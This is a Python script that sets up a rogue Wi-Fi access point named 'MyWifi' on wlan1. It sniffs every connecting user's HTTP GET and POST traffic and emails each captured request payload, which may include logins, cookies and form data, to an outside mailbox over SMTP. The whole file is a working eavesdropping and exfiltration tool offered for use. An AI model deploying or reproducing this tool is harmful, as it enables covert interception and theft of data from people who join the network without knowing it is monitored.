#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from email.mime.text import MIMEText
from scapy.all import *
import subprocess
import smtplib
import time
import sys
import os

def checkInstall():
	if not os.path.isfile('/usr/sbin/hostapd'):
		install = raw_input('[?]  hostapd not found in /usr/sbin/hostapd, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install hostapd')
		else:
			sys.exit('[x] hostapd not found in /usr/sbin/hostapd')
			return
	else:
		print '[√] hostapd has been installed.'

	if not os.path.isfile('/usr/bin/dnsmap'):
		install = raw_input('[?]  dnsmap not found in /usr/bin/dnsmap, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install dnsmap')
		else:
			sys.exit('[x] dnsmap not found in /usr/bin/dnsmap')
			return
	else:
		print '[√] dnsmap has been installed.'

	if not os.path.isfile('/usr/sbin/rfkill'):
		install = raw_input('[?]  rfkill not found in /usr/sbin/rfkill, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install rfkill')
		else:
			sys.exit('[x] rfkill not found in /usr/sbin/rfkill')
			return
	else:
		print '[√] rfkill has been installed.'

	if not os.path.isfile('/usr/sbin/haveged'):
		install = raw_input('[?]  haveged not found in /usr/sbin/haveged, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install haveged')
		else:
			sys.exit('[x] haveged not found in /usr/sbin/haveged')
			return
	else:
		print '[√] haveged has been installed.'

	if not os.path.isfile('/usr/bin/gcc'):
		install = raw_input('[?]  dnsmap not found in /usr/bin/gcc, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install gcc')
		else:
			sys.exit('[x] gcc not found in /usr/bin/gcc')
			return
	else:
		print '[√] gcc has been installed.'

	if not os.path.isfile('/usr/bin/make'):
		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install make')
		else:
			sys.exit('[x] make not found in /usr/bin/make')
			return
	else:
		print '[√] make has been installed.'

	if not os.path.isfile('/usr/bin/make'):
		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install make')
		else:
			sys.exit('[x] make not found in /usr/bin/make')
			return
	else:
		print '[√] make has been installed.'

	if not os.path.isfile('/usr/bin/create_ap'):
		install = raw_input('[?]  create_ap not found in /usr/bin/create_ap, install now? [y/n] ')
		if install == 'y':
			os.system('cd /tmp && git clone https://github.com/oblique/create_ap.git && cd create_ap && make install')
		else:
			sys.exit('[x] create_ap not found in /usr/bin/create_ap')
			return
	else:
		print '[√] create_ap has been installed.'

	if not os.path.isfile('/usr/bin/pip'):
		install = raw_input('[?]  pip not found in /usr/bin/pip, install now? [y/n] ')
		if install == 'y':
			os.system('cd /tmp && wget https://bootstrap.pypa.io/get-pip.py')
			os.system('python /tmp/get-pip.py')
		else:
			sys.exit('[x] pip not found in /usr/bin/pip')
			return
	else:
		print '[√] pip has been installed.'

	# update pip and python modules

	try:
		os.system('pip install -U pip')
	except:
		print '[x] update pip failed.'
		return

	try:
		__import__('scapy')
		print '[√] module scapy been installed.'
	except:
		install = raw_input('[?]  module scapy not found in python, install now? [y/n] ')
		if install == 'y':
			os.system('pip install -U scapy')
		else:
			sys.exit('[x] No module named scapy')
			return

	try:
		os.system('pip install -U email')
	except:
		print '[x] update email failed.'
		return

def dealPackage(packet):

	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")

	if len(lines[-1]) > 1 and len(lines) > 1:
		print '-'*90
		# reciver,title,body
		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
		for line in lines:
			print line

def sendMail(receiver, title, body):
    host = 'smtp.163.com'
    port = 25
    sender = '****@163.com'
    pwd = '****'

    msg = MIMEText(body, 'html')
    msg['subject'] = title
    msg['from'] = sender
    msg['to'] = receiver

    s = smtplib.SMTP(host, port)
    s.login(sender, pwd)
    s.sendmail(sender, receiver, msg.as_string())

    print '[*] The mail named %s to %s is sended successly.' % (title, receiver)

def dosniff():
	sniff_iface = 'wlan1'
	try:
		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
		print '[√] Sniffing on '+sniff_iface+'!'
	except Exception,e:
		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))

def createAP():
	net_iface = 'wlan0'
	ap_iface = 'wlan1'
	ap_ssid = 'MyWifi'
	ap_key = '12345678'
	ap_getway = '192.168.0.1'
	ap_dns = '8.8.8.8'
	try:
		cproc = subprocess.Popen(["create_ap",ap_iface,net_iface,ap_ssid,ap_key,"-g",ap_getway,"--dhcp-dns",ap_dns,"--no-virt"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
		print '[?] Please check AP {"SSID":%s,"KEY":%s} on %s!\n' % (ap_ssid,ap_key,ap_iface)
	except Exception,e:
		sys.exit('[x] Create AP failed! Please check!')

if __name__ == '__main__':
	print "================================================="
	print "|Create by MonkeyChain			   	|"
	print "|Blog www.92ez.com Email non3gov@gmail.com	|"
	print "|You should know what you are doing.	  	|"
	print "================================================="

	print '\n[*] Checking required...\n'
	checkInstall()
	print '\n[*] Required checked!\n'

	print '[*] Creating an AP!'
	createAP()

	print '[*] Start sniffing!'
	dosniff()
